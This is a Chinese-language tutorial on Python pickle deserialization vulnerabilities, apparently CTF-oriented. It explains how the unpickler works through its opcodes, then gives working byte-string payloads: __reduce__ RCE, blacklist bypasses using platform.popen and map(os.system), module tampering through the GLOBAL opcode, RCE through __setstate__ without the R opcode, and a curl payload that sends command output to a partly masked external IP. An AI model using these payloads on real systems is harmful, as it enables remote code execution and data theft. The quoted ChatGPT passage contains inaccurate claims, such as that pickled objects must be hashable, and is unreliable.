# python反序列化漏洞
以下是ChatGPT的回答
>Python中常见的反序列化漏洞主要出现在以下几个模块中：
>
>1. `pickle`模块：`pickle`是Python中用于对象序列化和反序列化的模块，在反序列化时存在安全风险。恶意攻击者可以构造恶意的序列化数据，通过反序列化执行任意代码。
>
>2. `json`模块：`json`模块是Python中用于处理JSON格式数据的模块，它也可以进行反序列化操作。在某些情况下，恶意攻击者可以通过构造特定的JSON数据来触发代码执行。
>
>3. `marshal`模块：`marshal`模块是Python中用于编码和解码内部Python对象的模块，它也可以进行反序列化操作。在某些情况下，恶意攻击者可以通过构造特定的`marshal`>数据来触发代码执行。
>
>4. `xml`模块：`xml`模块是Python中用于处理XML数据的模块，它也可以进行反序列化操作。在某些情况下，恶意攻击者可以通过构造特定的XML数据来触发代码执行。
>
>需要注意的是，这些模块在正常使用时并不会存在安全问题，只有在接收来自不可信源的序列化数据并进行反序列化操作时才会存在风险。因此，在处理来自不可信源的序列化数据时，应该谨慎使用这些模块，并对输入进行严格的验证和过滤，以防止恶意代码的执行。
## pickle模块反序列化漏洞
### 基础知识
模块pickle实现对一个python对象结构的二进制序列化和反序列化。"pickling"是将python对象及其所拥有的层次结构转化为一个字节流的过程。而 "unpickling" 是相反的操作，会将（来自一个 binary file 或者 bytes-like object 的）字节流转化回一个对象层次结构。
### 限制条件
Python的pickle模块可以用于序列化和反序列化Python对象。在使用pickle进行序列化时，需要满足以下条件：

1. 对象必须是可序列化的：只有支持pickle协议的对象才能被序列化。大部分Python内置类型（如int、float、list、dict等）都是可序列化的，也可以自定义类并实现`__getstate__()`和`__setstate__()`方法来支持序列化。

2. 对象必须是可哈希的：pickle使用哈希值来标识对象，因此对象必须是可哈希的。可哈希的对象包括字符串、整数、浮点数、元组等，而列表、字典等不可哈希。

3. 对象必须是可访问的：pickle需要访问对象的属性和方法来进行序列化。如果对象的属性或方法无法被pickle访问到，将无法正确序列化。

4. 对象必须是可导入的：如果要在另一个Python解释器中反序列化对象，那么对象的类必须是可导入的。因此，自定义类的定义必须在pickle和反pickle的解释器中都可用。
### 简单使用
```
 import pickle
 data={'name':'John','age':30}
 serialize_data = pickle.dumps(data)    #将对象序列化为字节流
 deserialize_data = pickle.loads(serialize_data) #将字节流反序列化为对象
#将data对象保存到文件 
with open('data.pkl', 'wb') as file:
    pickle.dump(data, file)
#从文件中加载对象
with open('data.pkl', 'rb') as file:
    loaded_data = pickle.load(file)
```
对于自定义的类，直接赋值是不会被打包，解决方式是使用`__init__()`方法
```
import pickle
class dairy():
    def __init__(self):
    self.date = 1235
x = dairy()
print(pickle.dumps(x))
```
### pickle.loads机制：调用_Unpickler类
pickle.loads是一个供我们调用的接口。其底层实现是基于_Unpickler类
```
def _load(file, *, fix_imports=True, encoding="ASCII", errors="strict",
          buffers=None):
    return _Unpickler(file, fix_imports=fix_imports, buffers=buffers,
                     encoding=encoding, errors=errors).load()

def _loads(s, /, *, fix_imports=True, encoding="ASCII", errors="strict",
           buffers=None):
    if isinstance(s, str):
        raise TypeError("Can't load pickle from unicode string")
    file = io.BytesIO(s)
    return _Unpickler(file, fix_imports=fix_imports, buffers=buffers,
                      encoding=encoding, errors=errors).load()
```
_load和_loads基本一致，都是把各自输入得到的东西作为文件流，赋值给`_Unpickler类`；然后调用_Unpickler.load()实现反序列化。
### _Unpickle类
在反序列化过程中，_Unpickler（以下称为机器吧）维护了两个东西：栈区和存储区。
栈是unpickle机最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护最顶层的信息，而前序栈维护下层的信息。这两个栈区的操作过程将在讨论MASK指令时解释。
　　存储区可以类比内存，用于存取变量。它是一个数组，以下标为索引。它的每一个单元可以用来存储任何东西，但是说句老实话，大多数情况下我们并不需要这个存储区。
　　您可以想象，一台机器读取我们输入的字符串，然后操作自己内部维护的各种结构，最后吐出来一个结果——这就是我们莫得感情的_Unpickler。为了研究它，也为了看懂那些乱七八糟的字符串，我们需要一个有力的调试器。这就是pickletools。
### pickletools：良心调试器
　pickletools是python自带的pickle调试器，有三个功能：反汇编一个已经被打包的字符串、优化一个已经被打包的字符串、返回一个迭代器来供程序使用。我们一般使用前两种。来看看效果吧：
```
import pickle
#定义一个对象
class dairy():
    def __init__(self):
        self.date = 12345
        self.text = "今天不错"
        self.todo = ['上午','下文']
#创建对象        
my_data = dairy()
s = pickle.dumps(my_data)
pickletools.dis(s)
```
运行结果
```
    0: \x80 PROTO      4
    2: \x95 FRAME      91
   11: \x8c SHORT_BINUNICODE '__main__'
   21: \x94 MEMOIZE    (as 0)
   22: \x8c SHORT_BINUNICODE 'dairy'
   29: \x94 MEMOIZE    (as 1)
   30: \x93 STACK_GLOBAL
   31: \x94 MEMOIZE    (as 2)
   32: )    EMPTY_TUPLE
   33: \x81 NEWOBJ
   34: \x94 MEMOIZE    (as 3)
   35: }    EMPTY_DICT
   36: \x94 MEMOIZE    (as 4)
   37: (    MARK
   38: \x8c     SHORT_BINUNICODE 'date'
   44: \x94     MEMOIZE    (as 5)
   45: M        BININT2    12345
   48: \x8c     SHORT_BINUNICODE 'text'
   54: \x94     MEMOIZE    (as 6)
   55: \x8c     SHORT_BINUNICODE '今天不错'
   69: \x94     MEMOIZE    (as 7)
   70: \x8c     SHORT_BINUNICODE 'todo'
   76: \x94     MEMOIZE    (as 8)
   77: ]        EMPTY_LIST
   78: \x94     MEMOIZE    (as 9)
   79: (        MARK
   80: \x8c         SHORT_BINUNICODE '上午'
   88: \x94         MEMOIZE    (as 10)
   89: \x8c         SHORT_BINUNICODE '下文'
   97: \x94         MEMOIZE    (as 11)
   98: e            APPENDS    (MARK at 79)
   99: u        SETITEMS   (MARK at 37)
  100: b    BUILD
  101: .    STOP
highest protocol among opcodes = 4
```
这就是反汇编功能：解析那个字符串，然后告诉你这个字符串干了些什么。每一行都是一条指令。接下来试一试优化功能：
```
import pickle
import pickletools
#定义一个对象
class dairy():
    def __init__(self):
        self.date = 12345
        self.text = "今天不错"
        self.todo = ['上午','下文']
#创建对象        
my_data = dairy()
s = pickle.dumps(my_data)
s = pickletools.optimize(s)
pickletools.dis(s)
```
结果
```
 0: \x80 PROTO      4
    2: \x95 FRAME      79
   11: \x8c SHORT_BINUNICODE '__main__'
   21: \x8c SHORT_BINUNICODE 'dairy'
   28: \x93 STACK_GLOBAL
   29: )    EMPTY_TUPLE
   30: \x81 NEWOBJ
   31: }    EMPTY_DICT
   32: (    MARK
   33: \x8c     SHORT_BINUNICODE 'date'
   39: M        BININT2    12345
   42: \x8c     SHORT_BINUNICODE 'text'
   48: \x8c     SHORT_BINUNICODE '今天不错'
   62: \x8c     SHORT_BINUNICODE 'todo'
   68: ]        EMPTY_LIST
   69: (        MARK
   70: \x8c         SHORT_BINUNICODE '上午'
   78: \x8c         SHORT_BINUNICODE '下文'
   86: e            APPENDS    (MARK at 69)
   87: u        SETITEMS   (MARK at 32)
   88: b    BUILD
   89: .    STOP
```
　可以看到，字符串s比以前短了很多，而且反汇编结果中，BINPUT指令没有了。所谓“优化”，其实就是把不必要的PUT指令给删除掉。这个PUT意思是把当前栈的栈顶复制一份，放进储存区——很明显，我们这个class并不需要这个操作，可以省略掉这些PUT指令。

　　利用pickletools，我们能很方便地看清楚每条语句的作用、检验我们手动构造出的字符串是否合法……总之，是我们调试的利器。现在手上有了工具，我们开始研究这个字符串是如何被pickle解读的吧。
###  反序列化机器：语法严格、向前兼容
pickle构造出的字符串，有很多个版本。在pickle.loads时，可以用Protocol参数指定协议版本，例如指定为0号版本：
```
my_data = dairy()
s = pickle.dumps(my_data,protocol=0)
print(s)
```
结果
```
ccopy_reg
_reconstructor
p0
(c__main__
dairy
p1
c__builtin__
object
p2
Ntp3
Rp4
(dp5
Vdate
p6
I12345
sVtext
p7
V\u4eca\u5929\u4e0d\u9519
p8
sVtodo
p9
(lp10
V\u4e0a\u5348
p11
aV\u4e0b\u6587
p12
asb.
```
目前这些协议有0,2,3,4号版本，默认为3号版本。这所有版本中，0号版本是人类最可读的；之后的版本加入了一大堆不可打印字符，不过这些新加的东西都只是为了优化，本质上没有太大的改动。
　　一个好消息是，pickle协议是向前兼容的。0号版本的字符串可以直接交给pickle.loads()，不用担心引发什么意外。
　　刚刚说过，字符串中包含了很多条指令。这些指令一定以一个字节的指令码（opcode）开头；接下来读取多少内容，由指令码来决定（严格规定了读取几个参数、参数的结束标志符等）。指令编码是紧凑的，一条指令结束之后立刻就是下一条指令。
![](vx_images/245945322231165.png =500x)
字符串的第一个字节是\x80（这个操作符于版本2被加入）。机器看到这个操作符，立刻再去字符串读取一个字节，得到x03。解释为“这是一个依据3号协议序列化的字符串”，这个操作结束。

　　机器取出下一个字符作为操作符——c。这个操作符（称为GLOBAL操作符）对我们以后的工作非常有用——它连续读取两个字符串module和name，规定以\n为分割；接下来把module.name这个东西压进栈。那么现在读取到的两个字符串分别是__main__和Student，于是把__main__.Student扔进栈里。

注：GLOBAL操作符读取全局变量，是使用的find_class函数。而find_class对于不同的协议版本实现也不一样。总之，它干的事情是“去x模块找到y”，y必须在x的顶层（也即，y不能在嵌套的内层）。
　　程序的车轮继续滚滚向前。它遇到了)这个操作符。它的作用是“把一个空的tuple压入当前栈”。处理完这个操作符之后，接下来程序读取到了x81操作符。它的作用是：从栈中先弹出一个元素，记为args；再弹出一个元素，记为cls。接下来，执行cls.__new__(cls, *args) ，然后把得到的东西压进栈。说人话，那就是：从栈中弹出一个参数和一个class，然后利用这个参数实例化class，把得到的实例压进栈。

　　容易看出，上面的操作全都执行完了之后，栈里面还剩下一个元素——它是被实例化了的Student对象，目前这里面什么也没有，因为当初实例化它的时候，args是个空的数组。

　　让我们继续分析。程序现在读入了一个}，它的意思是“把一个空的dict压进栈”。然后是MARK操作符，这个操作符干的事情称为load_mark：

把当前栈这个整体，作为一个list，压进前序栈。
把当前栈清空。
　　现在您知道为什么栈区要分成当前栈和前序栈两部分了吗？前序栈保存了程序运行至今的（不在顶层的）完整的栈信息，而当前栈专注于处理顶层的事件。

　　讲到这里，我们不得不介绍另一个操作——pop_mark。它没有操作符，只供其他的操作符来调用。干的事情自然是load_mark的反向操作：

记录一下当前栈的信息，作为一个list，在load_mark结束时返回。
弹出前序栈的栈顶，用这个list来覆盖当前栈。
load_mark相当于进入一个子过程，而pop_mark相当于从子过程退出，把栈恢复成调用子过程之前的情况。所有与栈的切换相关的事情，都靠调用这两个方法来完成。因此load_mark和pop_mark是栈管理的核心方法。

　　回到我们这个程序，继续看MARK之后的内容：
　　下一个操作符是V。它的意义是：读入一个字符串，以\n结尾；然后把这个字符串压进栈中。我们看到这里有四个V操作，它们全都执行完的时候，当前栈里面的元素是：（由底到顶）name, rxz, grade, G2。前序栈只有一个元素，是一个list，这个list里面有两个元素：一个空的Student实例，以及一个空的dict。

　　现在我们看到了u操作符。它干这样的事情：

调用pop_mark。也就是说，把当前栈的内容扔进一个数组arr，然后把当前栈恢复到MARK时的状态。
执行完成之后，arr=['name', 'rxz', 'grade', 'G2']；当前栈里面存的是__main__.Student这个类、一个空的dict
拿到当前栈的末尾元素，规定必须是一个dict。
这里，读到了栈顶那个空dict。
两个一组地读arr里面的元素，前者作为key，后者作为value，存进上一条所述的dict。
　　模拟一下这个过程，发现原先是空的那个dict现在变成了{'name': 'rxz', 'grade': 'G2'}这样一个dict。所以现在，当前栈里面的元素是：__main__.Student的一个空的实例，以及{'name': 'rxz', 'grade': 'G2'}这个dict。

　　下一个指令码是b，也就是BUILD指令。它干的事情是：

把当前栈栈顶存进state，然后弹掉。
把当前栈栈顶记为inst，然后弹掉。
利用state这一系列的值来更新实例inst。把得到的对象扔进当前栈。
注：这里更新实例的方式是：如果inst拥有__setstate__方法，则把state交给__setstate__方法来处理；否则的话，直接把state这个dist的内容，合并到inst.__dict__ 里面。
事实上，这里产生了一个安全漏洞。您可以想一想该如何利用。
　　上面的事情干完之后，当前栈里面只剩下了一个实例——它的类型是__main__.Student，里面name值是rxz，grade值是G2。下一个指令是.（一个句点，STOP指令），pickle的字符串以它结尾，意思是：“当前栈顶元素就是反序列化的最终结果，把它弹出，收工！”

注：使用pickletools.dis分析一个字符串时，如果.执行完毕之后栈里面还有东西，会抛出一个错误；而pickle.loads没有这么严格的检查——它会正常结束。
　　当所有的事情干完之后，我们得到了什么呢？如下图所示：
![](vx_images/118065422231304.png =500x)
　至此我们完成了一个简单例子的分析。刚刚我们通过手动模拟这台机器的运行过程，理解了pickle反序列化的原理——如何处理指令、如何管理栈等等。这已经足够我们把握pickle的思想，剩余的就是细枝末节的东西了。

　　但是，细枝末节的东西，往往暗藏着漏洞 :）
### __reduce__：（曾经的）万恶之源
在写下本文之前，CTF竞赛对pickle的利用多数是在__reduce__方法上。它的指令码是R，干了这么一件事情：

取当前栈的栈顶记为args，然后把它弹掉。
取当前栈的栈顶记为f，然后把它弹掉。
以args为参数，执行函数f，把结果压进当前栈。
　　class的__reduce__方法，在pickle反序列化的时候会被执行。其底层的编码方法，就是利用了R指令码。 f要么返回字符串，要么返回一个tuple，后者对我们而言更有用。

　　一种很流行的攻击思路是：利用 __reduce__ 构造恶意字符串，当这个字符串被反序列化的时候，__reduce__会被执行。网上已经有海量的文章谈论这种方法，所以我们在这里不过多讨论。只给出一个例子：正常的字符串反序列化后，得到一个Student对象。我们想构造一个字符串，它在反序列化的时候，执行ls /指令。那么我们只需要这样得到payload：
　　![](vx_images/563045422243394.png =500x)
　现在把payload拿给正常的程序（Student类里面没有__reduce__方法）去解析：　　
![](vx_images/128715522248433.png =500x)
那么，如何过滤掉reduce呢？由于__reduce__方法对应的操作码是R，只需要把操作码R过滤掉就行了。这个可以很方便地利用pickletools.genops来实现。
　　如果reduce这一套手段被过滤，我们应该如何利用呢？以下就是本篇文章的正题。
### 绕过函数黑名单：奇技淫巧
有一种过滤方式：不禁止R指令码，但是对R执行的函数有黑名单限制。典型的例子是2018-XCTF-HITB-WEB : Python's-Revenge。给了好长好长一串黑名单：
```
black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]
```
可惜platform.popen()不在名单里，它可以做到类似system的功能。这题死于黑名单有漏网之鱼。
　　另外，还有一个解（估计是出题人的预期解），那就是利用map来干这件事：
```
class Exploit(object):
    def __reduce__(self):
 	return map,(os.system,["ls"])
```
总之，黑名单不可取。要禁止reduce这一套方法，最稳妥的方式是禁止掉R这个指令码。
### 全局变量包含：c指令码的妙用
有这么一道题，彻底过滤了R指令码（写法是：只要见到payload里面有R这个字符，就直接驳回，简单粗暴）。现在的任务是：给出一个字符串，反序列化之后，name和grade需要与blue这个module里面的name、grade相对应。
![](vx_images/322585722249728.png =500x)
不能用R指令码了，不过没关系。还记得我们的c指令码吗？它专门用来获取一个全局变量。我们先弄一个正常的Student来看看序列化之后的效果：
![](vx_images/515605722250730.png =500x)
如何用c指令来换掉这两个字符串呢？以name的为例，只需要把硬编码的rxz改成从blue引入的name，写成指令就是：cblue\nname\n。把用于编码rxz的X\x03\x00\x00\x00rxz替换成我们的这个global指令，来看看改造之后的效果：
![](vx_images/124415822250907.png =500x)
把这个payload进行base64编码之后传进题目，得到well done。
![](vx_images/362255822236459.png =500x)
　顺带一提，由于pickle导出的字符串里面有很多的不可见字符，所以一般都经过base64编码之后传输。
### 绕过c指令module限制：先读入，再篡改
之前提到过，c指令（也就是GLOBAL指令）基于find_class这个方法， 然而find_class可以被出题人重写。如果出题人只允许c指令包含__main__这一个module，这道题又该如何解决呢？
　　通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改！
　　有了这个知识作为前提，我们可以干这么一件事：
通过__main__.blue引入这一个module，由于命名空间还在main内，故不会被拦截
把一个dict压进栈，内容是{'name': 'rua', 'grade': 'www'}
执行BUILD指令，会导致改写 __main__.blue.name和 __main__.blue.grade ，至此blue.name和blue.grade已经被篡改成我们想要的内容
弹掉栈顶，现在栈变成空的
照抄正常的Student序列化之后的字符串，压入一个正常的Student对象，name和grade分别是'rua'和'www'
　　由于栈顶是正常的Student对象，pickle.loads将会正常返回。到手的Student对象，当然name和grade都与blue.name、blue.grade对应了——我们刚刚亲手把blue篡改掉。
```
payload = b'\x80\x03c__main__\nblue\n}(Vname\nVrua\nVgrade\nVwww\nub0c__main__\nStudent\n)\x81}(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.'
```
![](vx_images/434485922252738.png =500x)
![](vx_images/5110023245783.png =500x)
题目返回了well done，而且此时blue.grade已经变成www，可见我们真的篡改了blue.
### 不用reduce，也能RCE
之前谈到过，__reduce__与R指令是绑定的，禁止了R指令就禁止了__reduce__ 方法。那么，在禁止R指令的情况下，我们还能RCE吗？这就是本文研究的重点。

　　现在的目标是，利用指令码，构造出任意命令执行。那么我们需要找到一个函数调用fun(arg)，其中fun和arg都必须可控。

　　审pickle源码，来看看BUILD指令（指令码为b）是如何工作的：
![](vx_images/349860023242550.png =500x)
这里的实现方式也就是上文的注所提到的：如果inst拥有__setstate__方法，则把state交给__setstate__方法来处理；否则的话，直接把state这个dist的内容，合并到inst.__dict__ 里面。

　　它有什么安全隐患呢？我们来想想看：Student原先是没有__setstate__这个方法的。那么我们利用{'__setstate__': os.system}来BUILE这个对象，那么现在对象的__setstate__就变成了os.system；接下来利用"ls /"来再次BUILD这个对象，则会执行setstate("ls /") ，而此时__setstate__已经被我们设置为os.system，因此实现了RCE.
```
payload = b'\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubVls /\nb.'　　
```
![](vx_images/193580123232881.png =500x)
结果
![](vx_images/463710123250924.png =500x)
成功RCE！接下来可以通过反弹shell来控制靶机了。

　　有一个可以改进的地方：这份payload由于没有返回一个Student，导致后面抛出异常。要让后面无异常也很简单：干完了恶意代码之后把栈弹到空，然后压一个正常Student进栈。payload构造如下：
```
payload = b'\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nStudent\n)\x81}(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.'
```
![](vx_images/301600223256679.png =500x)
![](vx_images/439980223257311.png =500x)
没有抛出异常。

　　至此，我们完成了不使用R指令、无副作用的RCE。Congratulations！

###  一些细节
　一、其他模块的load也可以触发pickle反序列化漏洞。例如：numpy.load()先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此numpy.load()也可以触发pickle反序列化漏洞。

　　二、即使代码中没有import os，GLOBAL指令也可以自动导入os.system。因此，不能认为“我不在代码里面导入os库，pickle反序列化的时候就不能执行os.system”。

　　三、即使没有回显，也可以很方便地调试恶意代码。只需要拥有一台公网服务器，执行os.system('curl your_server/`ls / | base64`)，然后查询您自己的服务器日志，就能看到结果。这是因为：以`引号包含的代码，在sh中会直接执行，返回其结果。

　　下面给出一个例子：
```
payload  = b'\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubVcurl 47.***.***.105/`ls / | base64`\nb.'
```
![](vx_images/237790323248047.png =500x)
![](vx_images/344830323240906.png =500x)
![](vx_images/497810323259715.png =500x)
pickle.loads()时，ls /的结果被base64编码后发送给服务器（红框）；我们的服务器查看日志，就可以得到命令执行结果。因此，在没有回显的时候，我们可以通过curl把执行结果送到我们的服务器上。
　　上文发出去的请求缺了一段，是因为url没有加引号。

## json模块反序列化漏洞
## marsha1模块反序列化漏洞
## xml模块反序列化漏洞
